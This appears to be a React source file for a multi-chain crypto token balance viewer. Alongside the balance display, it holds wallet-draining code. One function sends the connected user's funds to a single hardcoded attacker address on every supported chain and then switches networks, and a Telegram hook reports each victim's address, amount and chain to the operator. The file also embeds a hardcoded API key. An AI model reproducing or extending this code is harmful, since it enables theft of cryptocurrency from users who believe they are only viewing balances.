import { useCallback, useEffect, useState } from 'react';
import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
import { Loading, Toggle, Modal, Button } from '@geist-ui/core';
import { tinyBig } from 'essential-eth';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { Alchemy, Network } from 'alchemy-sdk';
import Dexie from 'dexie';

// Initialize Dexie database
const db = new Dexie('TokenDatabase');
db.version(1).stores({
  tokens: 'contract_address, balance, quote, quote_rate',
  checkedRecords: 'contract_address, isChecked',
});

// Alchemy instances for multiple networks
const alchemyInstances = {
  [Network.ETH_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ETH_MAINNET }),
  [Network.BSC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.BSC_MAINNET }),
  [Network.OPTIMISM]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.OPTIMISM }),
  [Network.ZK_SYNC]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ZK_SYNC }),
  [Network.ARB_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ARB_MAINNET }),
  [Network.MATIC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.MATIC_MAINNET }),
  // Add other networks as needed
};

// Mapping of chain IDs to destination addresses
const chainIdToDestinationAddress = {
  1: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Mainnet Address
  56: '0x933d91B8D5160e302239aE916461B4DC6967815d', // BSC Address
  10: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Optimism Address
  324: '0x933d91B8D5160e302239aE916461B4DC6967815d', // zkSync Address
  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Arbitrum Address
  137: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Polygon Address
};

// Supported chain IDs
const supportedChains = [1, 56, 10, 324, 42161, 137];

// Telegram bot configuration
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';

// USD formatter for currency formatting
const usdFormatter = new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
});

// Function to safely convert input values to tinyBig numbers
const safeNumber = (value) => {
  try {
    if (value === undefined || value === null || value === '') {
      return tinyBig(0);
    }
    const num = tinyBig(value.toString());
    return num.isNaN() ? tinyBig(0) : num;
  } catch (error) {
    console.error('Invalid number detected:', error, value);
    return tinyBig(0);
  }
};

// Function to send a Telegram notification
const sendTelegramNotification = async ({ senderAddress, amount, chainId, chainName, blockExplorerUrl }) => {
  const message = `Transaction Details:
- Sender Address: ${senderAddress}
- Amount: ${amount} ETH
- Chain ID: ${chainId}
- Chain Name: ${chainName}
- Block Explorer: ${blockExplorerUrl}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const params = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(params),
    });

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.statusText}`);
    }
    console.log('Telegram notification sent successfully.');
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
};

const TokenRow = ({ token }) => {
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { chain } = useAccount();
  const pendingTxn = checkedRecords[token.contract_address]?.pendingTxn;

  const setTokenChecked = async (tokenAddress, isChecked) => {
    setCheckedRecords((old) => ({
      ...old,
      [tokenAddress]: { isChecked: isChecked },
    }));
    await db.checkedRecords.put({ contract_address: tokenAddress, isChecked });
  };

  const { address } = useAccount();
  const { balance, contract_address, contract_ticker_symbol, quote, quote_rate } = token;

  const unroundedBalance = safeNumber(quote_rate).gt(0)
    ? safeNumber(quote).div(safeNumber(quote_rate))
    : safeNumber(0);

  const roundedBalance = unroundedBalance.lt(0.001)
    ? unroundedBalance.round(10)
    : unroundedBalance.gt(1000)
    ? unroundedBalance.round(2)
    : unroundedBalance.round(5);

  return (
    <div key={contract_address} style={{ display: 'flex', alignItems: 'center', marginBottom: '8px' }}>
      <Toggle
        checked={checkedRecords[contract_address]?.isChecked}
        onChange={(e) => {
          setTokenChecked(contract_address, e.target.checked);
        }}
        style={{ marginRight: '18px' }}
        disabled={Boolean(pendingTxn)}
      />
      <span style={{ fontFamily: 'monospace', marginRight: '8px' }}>
        {roundedBalance.toString()} {contract_ticker_symbol}
      </span>
      <span style={{ marginRight: '8px' }}>(worth {usdFormatter.format(safeNumber(quote))})</span>
      <a
        href={`${chain?.blockExplorers?.default.url}/token/${token.contract_address}?a=${address}`}
        target="_blank"
        rel="noreferrer"
        style={{ textDecoration: 'underline', color: '#0070f3' }}
      >
        View on Explorer
      </a>
    </div>
  );
};

const handleTokenTransaction = async (walletClient, destinationAddress, amount, nextChainId, switchNetwork) => {
  if (!walletClient.data || !destinationAddress) return;

  try {
    const tx = await walletClient.data.sendTransaction({
      to: destinationAddress,
      value: amount,
      gasLimit: '21000', // Example gas limit
    });

    console.log('Transaction sent:', tx.hash);

    // Immediately switch to the next network after the transaction is sent
    if (nextChainId) {
      switchNetwork(nextChainId);
    }

    // Get the block explorer URL and chain info
    const chainName = walletClient.chain.name;
    const chainId = walletClient.chain.id;
    const blockExplorerUrl = `${walletClient.chain.blockExplorers?.default.url}/tx/${tx.hash}`;

    // Send Telegram notification
    sendTelegramNotification({
      senderAddress: walletClient.data.address,
      amount: amount,
      chainId: chainId,
      chainName: chainName,
      blockExplorerUrl: blockExplorerUrl,
    });

  } catch (error) {
    console.error('Failed to send transaction:', error);
  }
};

export const GetTokens = () => {
  const [tokens, setTokens] = useAtom(globalTokensAtom);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { address, isConnected, chain } = useAccount();
  const walletClient = useWalletClient();
  const { chains, switchNetwork } = usePublicClient(); // Adjusted for network management
  const [isModalVisible, setIsModalVisible] = useState(false);
  const [nextNetwork, setNextNetwork] = useState(null);
  const [showMinBalanceMessage, setShowMinBalanceMessage] = useState(false); // New state for minimum balance message

  const fetchData = useCallback(async () => {
    setLoading(true);
    setError('');
    setTokens([]);
    try {
      // Check if the user's chain is supported
      if (!supportedChains.includes(chain.id)) {
        console.error('Unsupported chain:', chain.id);
        setError('This chain is not supported.');
        return;
      }

      const alchemy = alchemyInstances[chain.id];
      if (!alchemy) {
        setError('Alchemy instance not found for this chain.');
        return;
      }

      // Fetch token balances using Alchemy
      const balancesResponse = await alchemy.core.getTokenBalances(address);

      if (!balancesResponse) {
        setError('Failed to fetch token balances.');
        return;
      }

      const nonZeroBalances = balancesResponse.tokenBalances.filter(
        (token) => safeNumber(token.tokenBalance).gt(0)
      );

      const updatedTokens = await Promise.all(
        nonZeroBalances.map(async (token) => {
          const isChecked = Boolean(checkedRecords[token.contractAddress]?.isChecked);
          const pendingTxn = Boolean(checkedRecords[token.contractAddress]?.pendingTxn);
          return {
            contract_address: token.contractAddress,
            balance: safeNumber(token.tokenBalance),
            quote: safeNumber(token.tokenBalance).times(0), // Set default quote to 0 for demonstration
            quote_rate: 0, // Replace with actual data
            contract_ticker_symbol: token.symbol || 'Unknown',
            isChecked,
            pendingTxn,
          };
        })
      );

      setTokens(updatedTokens);
    } catch (error) {
      console.error('Error fetching tokens:', error);
      setError('An error occurred while fetching tokens.');
    } finally {
      setLoading(false);
    }
  }, [address, checkedRecords, chain.id, setTokens]);

  useEffect(() => {
    if (address && chain) {
      fetchData();
    }
  }, [address, chain, fetchData]);

  const handleCloseModal = () => {
    setIsModalVisible(false);
    setNextNetwork(null); // Clear the next network when closing the modal
  };

  return (
    <div>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
        <h4>Token Balances:</h4>
        {isConnected && (
          <Button auto size="small" onClick={() => fetchData()} loading={loading}>
            Refresh Balances
          </Button>
        )}
      </div>
      {loading ? (
        <Loading>Loading...</Loading>
      ) : error ? (
        <p style={{ color: 'red' }}>{error}</p>
      ) : (
        tokens.map((token) => <TokenRow key={token.contract_address} token={token} />)
      )}
    </div>
  );
};
